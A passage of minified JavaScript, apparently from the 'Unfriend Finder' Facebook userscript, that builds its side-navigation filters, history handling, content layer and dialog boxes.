}if(getFromId("updateUfFromFutureNav")){CSS3.hide(getFromId("updateUfFromFutureNav").parentNode);if(getFromId("updateUfFromFutureNav").firstElementChild){getFromId("updateUfFromFutureNav").firstElementChild.style.fontWeight=""}}}catch(exception){new ErrorHandler(exception,"filter.unmarkUpdate")}core.doctor.heal()};filter.setValue=function filterSetValue(_values,_from){if(!filter.isCapable){return}trace();Extend(filter.map,_values);try{core.menubar.setValue(filter.map.unfriends.counter.value);filter.map.unfriends.counter.element.innerHTML=filter.map.unfriends.counter.value;
filter.map.awaitings.counter.element.innerHTML=filter.map.awaitings.counter.value;filter.map.messages.counter.element.innerHTML=filter.map.messages.counter.value;if(!filter.map.unfriends.loadingIndicator.loading){CSS3.display(filter.map.unfriends.counter.element,(filter.map.unfriends.counter.value==0?CSS3.DISPLAY.none:CSS3.DISPLAY.inline))}if(!filter.map.awaitings.loadingIndicator.loading){CSS3.display(filter.map.awaitings.counter.element,(filter.map.awaitings.counter.value==0?CSS3.DISPLAY.none:CSS3.DISPLAY.inline))
}CSS3.display(filter.map.messages.counter.element,(filter.map.messages.counter.value==0?CSS3.DISPLAY.none:CSS3.DISPLAY.inline))}catch(exception){new ErrorHandler(exception,"filter.setValue()")}core.doctor.heal()};filter.getValue=function filterGetValue(_filter){trace();return filter[_filter].counter.value||0};filter.removeHistoryMark=function filterRemoveHistoryMark(){if(!filter.isCapable){return}trace();var n,filters=toArray(getFromId("sideNav").querySelectorAll(".historySelectedMark")),element;
filters.forEach(function(element){CSS3.removeClass(element,"historySelectedMark")})};filter.updateSelectedFilters=function filterUpdateSelectedFilters(bind){if(!filter.isCapable){return}trace();try{if(!getFromId(Params.filterName)){return}var n,filters=toArray(getFromId("sideNav").querySelectorAll("li")),filtersToWatch={},bookmarksNavs=toArray(getFromId("sideNav").querySelectorAll(".navHeader"));filters.forEach(function(element){try{if(/navItem_/.test(element.id)){if(element.id==Params.filterName){CSS3.addClass(element,"open selectedItem")
}else{CSS3.removeClass(element,"open selectedItem");if(bind){filter.bindDeselect(element,false)}}}}catch(exception){new ErrorHandler(exception,"filter.updateSelectedFilters()")}});bookmarksNavs.forEach(function(element){if(bind){filter.bindDeselect(element,true)}})}catch(exception){new ErrorHandler(exception,"filter.updateSelectedFilters()")}};filter.bindDeselect=function filterBindDeselect(_filter,_fromBookmarkLink){if(!filter.isCapable){return}var bindTo;trace();try{try{if(_filter.firstElementChild){bindTo=_filter.firstElementChild.nextElementSibling
}else{bindTo=_filter.querySelectorAll("a")[_filter.querySelectorAll("a").length-1]}if((bindTo instanceof HTMLElement)&&(bindTo.tagName!=="A")){bindTo=_filter.querySelectorAll("a")[_filter.querySelectorAll("a").length-1]}}catch(exception){bindTo=_filter.querySelectorAll("a")[_filter.querySelectorAll("a").length-1]}if(bindTo){EventMgr.addListener(bindTo,EventMgr.EVENTS.click,function(e){core.filter.removeHistoryMark();core.selectedWatcher=setInterval(function(){if(/selected/.test(_filter.className)){core.selectedWatcher=clearTimeout(core.selectedWatcher);
core.layer.layerHide("filter.bindDeselect")}},100)})}}catch(exception){new ErrorHandler(exception,"filter.bindDeselect()")}};filter.loadingIndicator=function filterLoadingIndicator(_filter,_state){if(!filter.isCapable){return}trace();try{if(_state){CSS3.hide(filter.map.unfriends.loadingIndicator.element);CSS3.hide(filter.map.awaitings.loadingIndicator.element);CSS3.hide(filter.map.settings.loadingIndicator.element);filter.map.unfriends.loadingIndicator.loading=false;filter.map.awaitings.loadingIndicator.loading=false;
filter.map.settings.loadingIndicator.loading=false;CSS3.hide(filter.map.unfriends.counter.element);CSS3.hide(filter.map.awaitings.counter.element);CSS3.hide(filter.map.messages.counter.element);if(filter.map.unfriends.counter.value!=0){CSS3.display(filter.map.unfriends.counter.element,CSS3.DISPLAY.inline)}if(filter.map.awaitings.counter.value!=0){CSS3.display(filter.map.awaitings.counter.element,CSS3.DISPLAY.inline)}if(filter.map.messages.counter.value!=0){CSS3.display(filter.map.messages.counter.element,CSS3.DISPLAY.inline)
}if(_filter=="unfriends"){CSS3.hide(filter.map.unfriends.counter.element);CSS3.display(filter.map.unfriends.loadingIndicator.element,CSS3.DISPLAY.inlineBlock);filter.map.unfriends.loadingIndicator.loading=true}else{if(_filter=="awaitings"){CSS3.hide(filter.map.awaitings.counter.element);CSS3.display(filter.map.awaitings.loadingIndicator.element,CSS3.DISPLAY.inlineBlock);filter.map.awaitings.loadingIndicator.loading=true}else{if(_filter=="settings"){if(filter.map.messages.counter.value!=0){CSS3.display(filter.map.settings.loadingIndicator.element,CSS3.DISPLAY.inlineBlock)
}filter.map.settings.loadingIndicator.loading=true}}}}else{CSS3.hide(filter.map.unfriends.loadingIndicator.element);CSS3.hide(filter.map.awaitings.loadingIndicator.element);CSS3.hide(filter.map.settings.loadingIndicator.element);filter.map.unfriends.loadingIndicator.loading=false;filter.map.awaitings.loadingIndicator.loading=false;filter.map.settings.loadingIndicator.loading=false;CSS3.hide(filter.map.unfriends.counter.element);CSS3.hide(filter.map.awaitings.counter.element);CSS3.hide(filter.map.messages.counter.element);
if(filter.map.unfriends.counter.value!=0){CSS3.display(filter.map.unfriends.counter.element,CSS3.DISPLAY.inline)}if(filter.map.awaitings.counter.value!=0){CSS3.display(filter.map.awaitings.counter.element,CSS3.DISPLAY.inline)}if(filter.map.messages.counter.value!=0){CSS3.display(filter.map.messages.counter.element,CSS3.DISPLAY.inline)}}}catch(exception){new ErrorHandler(exception,"filter.loadingIndicator()")}};filter.pushHistory=function filterPushHistory(_key){if(!filter.isCapable){return}trace();
Console.log("pushing History for "+_key);filter.blockHistoryEvent=true;var reg=new RegExp("\\?sk="+_key+"$");var regAll=new RegExp("\\?sk=(uf(s|m)?|unfriends|requests)$");if(core.userAgent.print("%o")=="iPhone"){return}if(!filter.pushState){window.history.pushState=function(){core.href(arguments[2])}}if((Params.env.isFirefox)&&(core.userAgent.print("%v")[0]<5)){return}if((Params.env.isIE)&&(core.userAgent.print("%v")<10)){return}if(!reg.test(window.location.search)){document.location.hash="!/?sk="+_key
}else{if((regAll.test(window.location.search))&&(!filter.firstUse)){document.location.hash=""}}setTimeout(function(){core.filter.blockHistoryEvent=false},1000);if(!filter.pushState){window.history.pushstate=null}};filter.handleHistory=function filterHandleHistory(event){if(!filter.isCapable){return}if(filter.blockHistoryEvent){return}trace();var href=window.location.href;if(/\?sk=unfriends#?$/.test(href)){core.filter.select("unfriends","handleHistory")}else{if(/\?sk=requests#?$/.test(href)){core.filter.select("awaitings","handleHistory")
}else{if(/\?sk=ufs#?$/.test(href)){core.filter.select("settings","handleHistory")}else{if(/\?sk=ufm#?$/.test(href)){core.filter.select("messages","handleHistory")}else{if(filter.originItem){CSS3.addClass(filter.originItem,"open selectedItem");CSS3.addClass(filter.originItem.firstElementChild,"historySelectedMark")}core.layer.layerHide("handleHistory")}}}}};filter.select=function filterSelect(_filter,_from){if(!filter.isCapable){return}trace();Console.info("Filter clicked ("+_filter+") from "+_from);
if(!filter.originItem){filter.originItem=getFromId("sideNav").querySelectorAll("li.selectedItem")[0]}filter.removeHistoryMark();switch(_filter){case"unfriends":if((getCoreFilter())&&(getFromId(Params.filterName))){if(/selectedItem/.test(filter.map.unfriends.element.parentNode.className)){return}document.title="Unfriends";core.layer.layerShow("unfriends");filter.loadingIndicator("unfriends",true);CSS3.setClass(getFromId(Params.filterName),"sideNavItem selectedItem open");CSS3.setClass(filter.map.awaitings.element.parentNode,"");
CSS3.setClass(filter.map.settings.element.parentNode,"");CSS3.setClass(filter.map.messages.element.parentNode,"");CSS3.display(getFromId("loadingLists"),CSS3.DISPLAY.block);setTimeout(function(){core.showUnfriends("select filter unfriends")},(core.userAgent.print("%o")=="iPhone"?0:600));CSS3.display(getFromId("UFLists"),CSS3.DISPLAY.block);CSS3.hide(getFromId("UFSettings"));CSS3.hide(getFromId("UFMessages"));CSS3.addClass(Params.body,"uflist");CSS3.removeClass(Params.body,"nonuflist");filter.pushHistory("unfriends")
}if(core.dialogs.filterContextual){CSS3.hide(getFromId("callout_dialog_filterContextual"));helps.filter=true;Registry.setKey(core.user_id+"_helps",stringify(helps))}break;case"awaitings":if((getCoreFilter())&&(getFromId(Params.filterName))){if(/selectedItem/.test(filter.map.awaitings.element.parentNode.className)){return}document.title="Awaiting Requests";core.layer.layerShow("awaitings");filter.loadingIndicator("awaitings",true);CSS3.setClass(getFromId(Params.filterName),"sideNavItem open");CSS3.setClass(filter.map.awaitings.element.parentNode,"selectedItem");
CSS3.setClass(filter.map.settings.element.parentNode,"");CSS3.setClass(filter.map.messages.element.parentNode,"");core.showAwaitingRequests();CSS3.display(getFromId("UFLists"),CSS3.DISPLAY.block);CSS3.hide(getFromId("UFSettings"));CSS3.hide(getFromId("UFMessages"));CSS3.addClass(Params.body,"uflist");CSS3.removeClass(Params.body,"nonuflist");try{core.dialogs.awaitingsContextual.Hide()}catch(ex){}filter.pushHistory("requests")}break;case"settings":if((getCoreFilter())&&(getFromId(Params.filterName))){if(/selectedItem/.test(filter.map.settings.element.parentNode.className)){return
}document.title="Unfriend Finder Settings";core.layer.layerShow("settings");filter.loadingIndicator("settings",false);CSS3.setClass(getFromId(Params.filterName),"sideNavItem open");CSS3.setClass(filter.map.awaitings.element.parentNode,"");CSS3.setClass(filter.map.settings.element.parentNode,"selectedItem");CSS3.setClass(filter.map.messages.element.parentNode,"");core.settings.bindSettings();CSS3.hide(getFromId("UFLists"));CSS3.display(getFromId("UFSettings"),CSS3.DISPLAY.block);CSS3.hide(getFromId("UFMessages"));
CSS3.addClass(Params.body,"uflist");CSS3.removeClass(Params.body,"nonuflist");try{core.dialogs.awaitingsContextual.Hide()}catch(ex){}filter.pushHistory("ufs");new xHTMLElement({element:"link",type:"text/css",href:Params.links.rsrc+"/z7FGL/hash/ys9cv6ix.css",id:"ys9cv6ix",rel:"stylesheet",parentNode:Params.head})}break;case"messages":if((getCoreFilter())&&(getFromId(Params.filterName))){if(/selectedItem/.test(filter.map.messages.element.parentNode.className)){return}document.title="Messages";core.layer.layerShow("messages");
CSS3.setClass(getFromId(Params.filterName),"sideNavItem open");CSS3.setClass(filter.map.awaitings.element.parentNode,"");CSS3.setClass(filter.map.settings.element.parentNode,"");CSS3.setClass(filter.map.messages.element.parentNode,"selectedItem");core.showMessages();CSS3.hide(getFromId("UFLists"));CSS3.hide(getFromId("UFSettings"));CSS3.display(getFromId("UFMessages"),CSS3.DISPLAY.block);CSS3.addClass(Params.body,"uflist");CSS3.removeClass(Params.body,"nonuflist");try{core.dialogs.awaitingsContextual.Hide()
}catch(ex){}filter.pushHistory("ufm")}break}core.doctor.heal();filter.firstUse=false};filter.build();filter.toString=function toString(){return"[object Filter]"};return filter};var UFLayer=function UFLayer(){var layer=this;layer.active=false;layer.displayed=false;layer.firstCreated=false;layer.currentHeader=null;layer.layerShow=function layerShow(_header){if(layer.active){if(!getFromId("contentUnfriends")){layer.active=false}}if(!layer.active){if(getFromId("rightColUF")){rightColUF=getFromId("rightColUF")
}else{rightColUF=new xHTMLElement({element:"div",id:"rightColUF",innerHTML:"",parentNode:getFromId("rightCol").parentNode,after:getFromId("rightCol")}).getElement()}rightColUF.innerHTML="";new (UnfriendFinderBox);var div;if(!getFromId("contentUnfriends")){div=new xHTMLElement({element:"div",id:"contentUnfriends",style:{width:"505px",paddingLeft:"15px",cssFloat:"left",display:CSS3.DISPLAY.block},parentNode:getFromId("contentArea").parentNode,before:getFromId("contentArea")}).getElement()}CSS3.addClass(getFromId("contentCol"),"hasRightCol homeWiderContent friendListFilter homeFixedLayout");
CSS3.addClass(document.body,"uflist");getFromId("contentArea").innerHTML="";new xHTMLElement({element:"link",type:"text/css",href:Params.links.rsrc+"/v1/yy/r/POIirpFgl5q.css",id:"POIirpFgl5q",rel:"stylesheet",parentNode:Params.head});if(!helps.tutorial){EventMgr.addListener(getFromId("unfriendFinder_message_close"),EventMgr.EVENTS.click,function(){CSS3.hide(getFromId("unfriendFinder_message"));helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.tutorial=true;Registry.setKey(core.user_id+"_helps",stringify(helps))
});getFromId("unfriendFinder_message_content").innerHTML='<span class="en_US">If you are new to Unfriend Finderzz,<br /><a href="#" id="takeTutorialEn">take the quick tutorial !</a></span><span class="fr_FR">Si Unfriend Finder vous est encore inconnu,<br /><a href="#" id="takeTutorialFr">lisez le tutoriel !</a></span>';EventMgr.addListener(getFromId("takeTutorialEn"),EventMgr.EVENTS.click,core.loadWelcomeFacebox);EventMgr.addListener(getFromId("takeTutorialFr"),EventMgr.EVENTS.click,core.loadWelcomeFacebox)
}else{CSS3.hide(getFromId("unfriendFinder_message"))}}if(CSS3.hasClass(getSideNav(),"binded")){core.filter.updateSelectedFilters(false)}else{core.filter.updateSelectedFilters(true);CSS3.addClass(getSideNav(),"binded")}div=getFromId("contentUnfriends");div.innerHTML=parseTemplate('<div class="clearfix UIIntentionalStream_Top">   <div class="uiHeader uiHeaderWithImage uiHeaderPage fbx_stream_header">       <div class="clearfix uiHeaderTop">           <div class="uiHeaderActions rfloat fsl fwb fcb">               <span class="fwn"><a href="#/?sk=requests" id="awaitingsLink">::awaitings::</a></span>               <span id="ufBubbleCount" class="uiBubbleCount mls" style="cursor:default; margin-top:0px; display:none;"><span class="numberContainer"><span id="BubbleCountUF" class="number countValue fsm">0</span></span></span>           </div>           <div class="lfloat">               <h2 class="uiHeaderTitle" id="bindHeader"><i id="iconHeader" class="uiHeaderImage img spritemap_9mvze7 spritemap_app_icons sx_app_icons_unfriends"></i><span id="title_header">::title::</span></h2>           </div>       </div>   </div></div><div id="homeUnfriends">::ufLists::</div>',{params:{ufLists:template.UnfriendLists(),awaitings:LANG.awaiting,title:Params._0x4d22}});
CSS3.display(getFromId("pagelet_unfriendfinder"),CSS3.DISPLAY.block);CSS3.display(div,CSS3.DISPLAY.block);layer.setHeader(_header);if(getFromId("headerArea")){getFromId("headerArea").innerHTML=""}if(!layer.active){setTimeout(function(){core.checkFanGroupStatus()},1000)}layer.active=true;layer.firstCreated=true;core.doctor.heal()};layer.layerHide=function layerHide(_from){trace();if(!layer.active){return}if(getFromId(Params.filterName)){layer.active=false;core.filter.originItem=null;core.watchingFilters=false;
CSS3.addClass(Params.body,"nonuflist");CSS3.removeClass(Params.body,"uflist");CSS3.setClass(getFromId(Params.filterName),"sideNavItem");CSS3.setClass(getFromId("UFfilterAwaitings").parentNode,"");CSS3.setClass(getFromId("UFfilterSettings").parentNode,"");CSS3.setClass(getFromId("UFfilterMessages").parentNode,"");core.filter.loadingIndicator("unfriends",false);if(core.dialogs.changelog){core.dialogs.changelog.Hide()}if(core.dialogs.helpreappearedContextual){core.dialogs.helpreappearedContextual.Hide()
}if(core.dialogs.pagingHelp){core.dialogs.pagingHelp.Hide()}if(core.dialogs.newManagementLists){core.dialogs.newManagementLists.Hide()}core.doctor.heal()}};layer.setHeader=function layerSetHeader(_header){if(_header==layer.currentHeader){return}if(!getFromId("title_header")){return}layer.currentHeader=_header;trace();var n,i;i=getFromId("awaitingsLink").parentNode.innerHTML;getFromId("awaitingsLink").parentNode.innerHTML=i;switch(_header){case"unfriends":layer.setHeaderCounter(core.keepAwaitingList.Count());
CSS3.setClass(getFromId("iconHeader"),"uiHeaderImage img spritemap_9mvze7 spritemap_app_icons  sx_app_icons_unfriends");getFromId("title_header").innerHTML=Params._0x4d22;getFromId("awaitingsLink").innerHTML=LANG.awaiting;EventMgr.addListener(getFromId("awaitingsLink"),EventMgr.EVENTS.click,function(){core.filter.select("awaitings")});getFromId("awaitingsLink").href="#/?sk=unfriends";break;case"awaitings":layer.setHeaderCounter(core.getCounter(true));CSS3.setClass(getFromId("iconHeader"),"uiHeaderImage img spritemap_9mvze7 spritemap_app_icons sx_app_icons_awaitings");
getFromId("title_header").innerHTML=LANG.awaiting;getFromId("awaitingsLink").innerHTML=LANG.unfriends;EventMgr.addListener(getFromId("awaitingsLink"),EventMgr.EVENTS.click,function(){core.filter.select("unfriends","setHeader")});getFromId("awaitingsLink").href="#/?sk=requests";break;case"settings":layer.setHeaderCounter(0);CSS3.setClass(getFromId("iconHeader"),"uiHeaderImage img spritemap_9mvze7 spritemap_app_icons sx_app_icons_settings");getFromId("title_header").innerHTML=LANG.settings;getFromId("awaitingsLink").innerHTML=LANG.help;
getFromId("awaitingsLink").href="https://www.unfriendfinder.com/help";break;case"messages":layer.setHeaderCounter(0);CSS3.setClass(getFromId("iconHeader"),"uiHeaderImage img sx_app_icons_message");getFromId("title_header").innerHTML=LANG.messages;getFromId("awaitingsLink").innerHTML=LANG.help;getFromId("awaitingsLink").href="https://www.unfriendfinder.com/help";break;case"about":layer.setHeaderCounter(0);CSS3.setClass(getFromId("iconHeader"),"uiHeaderImage img sx_app_icons_message");getFromId("title_header").innerHTML="About";
getFromId("awaitingsLink").innerHTML=LANG.help;getFromId("awaitingsLink").href="https://www.unfriendfinder.com/help";break}if(getFromId("chgLang")){EventMgr.addListener(getFromId("chgLang"),EventMgr.EVENTS.click,function(){Registry.setKey("language",suggestLocale);core.reloadPage()})}if(getFromId("close_pagelet_language")){EventMgr.addListener(getFromId("close_pagelet_language"),EventMgr.EVENTS.click,function(){helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.change_language=true;Registry.setKey(core.user_id+"_helps",stringify(helps));
CSS3.hide(getFromId("pagelet_language"))})}EventMgr.addListener(getFromId("settingsLink"),EventMgr.EVENTS.click,function(){core.filter.select("settings")});core.doctor.heal()};layer.setHeaderCounter=function setHeaderCounter(_value){trace();var counter;if(counter=getFromId("ufBubbleCount")){getFromId("BubbleCountUF").innerHTML=_value;if(!_value){CSS3.hide(counter)}else{CSS3.display(counter,CSS3.DISPLAY.inlineBlock)}}};layer._showNoUnfriends=function _showNoUnfriends(){trace();if(getFromId("homeUnfriends")){getFromId("homeUnfriends").innerHTML=template.UnfriendLists()
}CSS3.hide(getFromId("noAwaitings"));CSS3.display(getFromId("noUnfriends"),CSS3.DISPLAY.block);CSS3.hide(getFromId("groupPending"));CSS3.hide(getFromId("groupAcceptedIgnored"));CSS3.hide(getFromId("groupUnfriends"));CSS3.hide(getFromId("groupReappeared"));CSS3.hide(getFromId("groupAccepted"));CSS3.hide(getFromId("groupIgnored"));core.filter.loadingIndicator("unfriends",false);layer.showError()};layer._showUnfriends=function _showUnfriends(){trace();if(getFromId("homeUnfriends")){getFromId("homeUnfriends").innerHTML=template.UnfriendLists()
}CSS3.hide(getFromId("noAwaitings"));CSS3.hide(getFromId("noUnfriends"));CSS3.hide(getFromId("groupPending"));CSS3.hide(getFromId("groupAcceptedIgnored"));CSS3.hide(getFromId("groupUnfriends"));CSS3.hide(getFromId("groupReappeared"));CSS3.hide(getFromId("groupAccepted"));CSS3.hide(getFromId("groupIgnored"));layer.showError()};layer._showNoAwaitings=function _showNoAwaitings(){trace();if(getFromId("homeUnfriends")){getFromId("homeUnfriends").innerHTML=template.UnfriendLists()}CSS3.display(getFromId("noAwaitings"),CSS3.DISPLAY.block);
CSS3.hide(getFromId("noUnfriends"));CSS3.hide(getFromId("groupPending"));CSS3.hide(getFromId("groupAcceptedIgnored"));CSS3.hide(getFromId("groupUnfriends"));CSS3.hide(getFromId("groupReappeared"));CSS3.hide(getFromId("groupAccepted"));CSS3.hide(getFromId("groupIgnored"));core.filter.loadingIndicator("awaitings",false);layer.showError()};layer._showAwaitings=function _showAwaitings(){trace();if(getFromId("homeUnfriends")){getFromId("homeUnfriends").innerHTML=template.UnfriendLists()}CSS3.hide(getFromId("noAwaitings"));
CSS3.hide(getFromId("noUnfriends"));CSS3.hide(getFromId("groupPending"));CSS3.hide(getFromId("groupAcceptedIgnored"));CSS3.hide(getFromId("groupUnfriends"));CSS3.hide(getFromId("groupReappeared"));CSS3.hide(getFromId("groupAccepted"));CSS3.hide(getFromId("groupIgnored"));layer.showError()};layer.showError=function showError(){trace();if((core.payloadFriendsOnly)&&(core.overflow())){CSS3.display(getFromId("unfriendsError"),CSS3.DISPLAY.block)}if(core.friendlist.getError()){if(getFromId("databaseError")){CSS3.display(getFromId("databaseError"),CSS3.DISPLAY.block)
}if(getFromId("loadingLists")){CSS3.hide(getFromId("loadingLists"))}core.filter.loadingIndicator("unfriends",false);core.filter.loadingIndicator("awaitings",false)}};layer.hideError=function hideError(){return;trace();CSS3.hide(getFromId("unfriendsError"));helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.incompleteDB=true;Registry.setKey(core.user_id+"_helps",stringify(helps))};layer.hideUnfriendLayerFromSideNavFilter=function hideUnfriendLayerFromSideNavFilter(_filter){trace();if(/sideNavItem/.test(_filter.className)){layer.layerHide("hideUnfriendLayerFromSideNavFilter")
}};layer.toString=function toString(){return"[object UFLayer]"};return layer};var Facebox=function Facebox(__constructor){var facebox=this;Extend(facebox,__constructor);if((!facebox.id)||(!facebox.title)||(!facebox.body)){throw (new Error("Facebox() : Please give ID, Title and Body in object constructor"));return}if(getFromId("contextual_dialog_"+facebox.id)){return}facebox.defaultButton={name:"hide",value:LANG.btn_close,id:"hide_button",handler:function(){void (0)},disabled:false,closer:true,type:"blue"};
if(!facebox.buttons){facebox.buttons=[facebox.defaultButton]}if(facebox.indicator){facebox.loading="loading"}facebox.fanimage=Params.images.fanImage+"?type=normal";facebox.Build=function faceboxBuild(){var content=(getFromId("content")?getFromId("content"):Params.body);if(facebox.picture){facebox.picture='<img class="UIImageBlock_Image UIImageBlock_MED_Image img" src="'+facebox.picture+'">'}else{facebox.picture=""}if(facebox.width){var cssLeft=Math.round((facebox.width-445)/2);var cssWidth=facebox.width;
var css=" left: -"+cssLeft+"px; width: "+cssWidth+"px"}facebox.window=new xHTMLElement({element:"div",id:"dialog_"+facebox.id,className:"generic_dialog uf_dialog pop_dialog"+(facebox.error?" dialog_error":"")+(facebox.header?" header":""),style:{position:"fixed",opacity:(facebox.fade?0:1)},innerHTML:parseTemplate('<div class="generic_dialog_popup" style="top: 125px; position:relative; display:inherit;'+css+'">    <div class="pop_container_advanced">        <div class="pop_content">            <h2 id="dialog_h2_::id::" class="dialog_title ::loading::">                <span id="dialog_title_::id::"></span>            </h2>            <div class="dialog_content">               <div class="dialog_body" id="dialog_content_::id::" style="display:none; ::bodyStyle::">                   <div class="clearfix">                       ::picture::                       <div class="UIImageBlock_Content UIImageBlock_MED_Content" id="dialog_body_::id::"></div>                   </div>               </div>               <div class="dialog_buttons" id="dialog_buttons_::id::">                   <span id="dialog_hint_::id::" style="color:#888888; font-size:12px; float:left; padding-top:5px; padding-left:1px; cursor:default;"></span>               </div>            </div>        </div>    </div></div>',facebox)}).getElement();
content.insertBefore(facebox.window,content.firstElementChild);var i=1;facebox.buttons.forEach(function(button){var span=new xHTMLElement({element:"span",id:"dialog_buttons_"+facebox.id+"_"+i++,className:"uiButton uiButtonLarge",parentNode:getFromId("dialog_buttons_"+facebox.id)}).getElement();if(button.type=="green"){CSS3.addClass(span,"uiButtonSpecial UIButton_Green")}else{if(button.type=="gray"){CSS3.addClass(span,"UIButton_Gray uiButtonDefault")}else{CSS3.addClass(span,"UIButton_Blue uiButtonConfirm")
}}var buttonElement=new xHTMLElement({element:"input",className:"UIButton_Text",type:"button",name:button.name,value:button.value,disabled:button.disabled,listeners:{click:button.handler},parentNode:span}).getElement();if(button.closer){EventMgr.addListener(buttonElement,EventMgr.EVENTS.click,facebox.Hide)}});CSS3.display(getFromId("dialog_content_"+facebox.id),CSS3.DISPLAY.block);return facebox};facebox.Destroy=function faceboxDestroy(){try{(getFromId("content")?getFromId("content"):Params.body).removeChild(facebox.window)
}catch(exception){}};facebox.Show=function faceboxShow(){try{if(facebox.overlay){facebox.overlay.Show()}facebox.fadeIn()}catch(exception){}};facebox.fadeIn=function faceboxFadeIn(){if(!facebox.fade){if(facebox.loading){setTimeout(facebox.ShowEnd,facebox.timeout)}else{facebox.ShowEnd()}facebox.window.style.opacity=1;return facebox}else{if(facebox.window.style.opacity>=1){if(facebox.loading){setTimeout(facebox.ShowEnd,facebox.timeout)}else{facebox.ShowEnd()}return facebox}facebox.window.style.opacity=parseFloat(facebox.window.style.opacity)+Params.Facebox.Fades.Step;
setTimeout(facebox.fadeIn,Params.Facebox.Fades.Timer)}};facebox.ShowEnd=function faceboxShowEnd(){getFromId("dialog_body_"+facebox.id).innerHTML="";if(facebox.body.id){getFromId("dialog_body_"+facebox.id).appendChild(facebox.body)}else{getFromId("dialog_body_"+facebox.id).innerHTML=facebox.body}getFromId("dialog_title_"+facebox.id).innerHTML=facebox.title;CSS3.setClass(getFromId("dialog_content_"+facebox.id).parentNode,"dialog_content");CSS3.setClass(getFromId("dialog_h2_"+facebox.id),"dialog_title");
if(typeof facebox.afterLoad=="function"){facebox.afterLoad()}if(facebox.hint){getFromId("dialog_hint_"+facebox.id).innerHTML=facebox.hint}};facebox.showReset=function faceboxShowReset(){getFromId("dialog_body_"+facebox.id).innerHTML="Resetting...";CSS3.setClass(getFromId("dialog_content_"+facebox.id).parentNode,"dialog_loading");getFromId("dialog_content_"+facebox.id).style.borderBottom="none";getFromId("dialog_buttons_"+facebox.id).innerHTML="";setTimeout(facebox.Hide,2000)};facebox.Hide=function faceboxHide(){if(facebox.overlay){facebox.overlay.Hide()
}facebox.fadeOut()},facebox.fadeOut=function faceboxFadeOut(){if(!facebox.fade){facebox.Destroy()}else{if(facebox.window.style.opacity<=parseFloat(0.03)){facebox.Destroy();return facebox}facebox.window.style.opacity=parseFloat(facebox.window.style.opacity)-Params.Facebox.Fades.Step;setTimeout(facebox.fadeOut,Params.Facebox.Fades.Timer)}};Facebox.prototype.valueOf=function(){return facebox.me};Facebox.prototype.getButton=function(i){return facebox.buttons[i]};facebox.Build();if(facebox.buttons.length==0){getFromId("dialog_buttons_"+facebox.id).parentNode.removeChild(getFromId("dialog_buttons_"+facebox.id));
getFromId("dialog_content_"+facebox.id).style.borderBottom="none"}getFromId("dialog_title_"+facebox.id).innerHTML=facebox.title;if(facebox.loading){getFromId("dialog_body_"+facebox.id).innerHTML="Loading...";CSS3.setClass(getFromId("dialog_content_"+facebox.id).parentNode,"dialog_loading")}else{if(facebox.body.id){getFromId("dialog_body_"+facebox.id).appendChild(facebox.body)}else{getFromId("dialog_body_"+facebox.id).innerHTML=facebox.body}CSS3.setClass(getFromId("dialog_content_"+facebox.id).parentNode,"dialog_content")
}facebox.toString=function toString(){return"[object Facebox]"};return this};var WelcomeBox=function WelcomeBox(__constructor){var welcomebox=this;Extend(welcomebox,__constructor);if((!welcomebox.id)||(!welcomebox.body)){throw (new Error("WelcomeBox() : Please give ID, Title and Body in object constructor"));return}if(getFromId("contextual_dialog_"+welcomebox.id)){return}welcomebox.defaultButton={name:"hide",value:LANG.btn_close,id:"hide_button",handler:function(){void (0)},disabled:false,closer:true,type:"blue"};
if(!welcomebox.buttons){welcomebox.buttons=[welcomebox.defaultButton]}if(welcomebox.loading){welcomebox.load=true}welcomebox.Build=function welcomeboxBuild(){var content=(getFromId("content")?getFromId("content"):Params.body);welcomebox.window=new xHTMLElement({element:"div",id:"dialog_"+welcomebox.id,className:"generic_dialog uf_dialog pop_dialog"+(welcomebox.error?" dialog_error":"")+(welcomebox.header?" header":""),style:{position:"fixed",opacity:(welcomebox.fade?0:1),zIndex:500},innerHTML:parseTemplate('<div class="generic_dialog_popup" style="top: 50px; position:relative; display:inherit;">    <div class="pop_container_advanced">        <div class="pop_content">            <h2 style="cursor:move;" id="dialog_h2_::id::" class="dialog_title ::loading::">                <div style="float: right; clear: both; position: relative; top: 7px; left: -7px;">                   <span style="display:none; color:white; font-size:x-small; font-weight:normal; margin-top:-4px; cursor:pointer;" id="dialog_header_close_::id::">::close::</span>                </div>                <span id="dialog_title_::id::">::title::</span>            </h2>            <div class="dialog_content">               <div style="display: none; padding: 0pt;" class="uf_dialog_header dialog_body">                  <div>                      <img alt="Unfriend Finder" src="::fanimage::" style="width: 80px; margin-left: 8px" bindpoint="icon">                      <span style="color: rgb(51, 51, 51); display: block; float: right; width: 500px; font-size: xx-large; padding-top: 25px; font-weight: bold;">Unfriend Finder</span>                  </div>               </div>               <div class="dialog_body" id="dialog_content_::id::" style="overflow:hidden; display:none; padding:0px; ::bodyStyle::">                   <ul class="flat uf_cards" id="uf_cards" style="left:0px">                       <li style="padding:10px;" id="welcomeBox_card1"></li>                       <li style="padding:10px;" id="welcomeBox_card2"></li>                       <li style="padding:10px;" id="welcomeBox_card3"></li>                       <li style="padding:10px;" id="welcomeBox_card4"></li>                       <li style="padding:10px;" id="welcomeBox_card5"></li>                       <li style="padding:10px;" id="welcomeBox_card6"></li>                   </ul>               </div>               <div class="dialog_buttons" id="dialog_buttons_::id::">                   <span style="display: inline-block; width: 100px; font-weight:bold; float:left; margin-top: 5px; background: none repeat scroll 0% 0% rgb(237, 239, 244); border: 1px solid rgb(49, 78, 143); height: 12px; font-size: 10px; line-height: 11px;">                       <span id="welcome_progress" style="display: inline-block; float: left; background: none repeat scroll 0% 0% rgb(99, 123, 173); height: 12px; width: 0%; color: rgb(237, 239, 244); text-shadow: 0pt 1px 3px black ! important; text-align: left; font-size: 11px;">0%</span>                   </span>               </div>            </div>        </div>    </div></div>',{params:Extend({loading:(welcomebox.indicator?"loading":""),fanimage:Params.images.fanImage+"?type=normal",close:LANG.btn_close},welcomebox)})}).getElement();
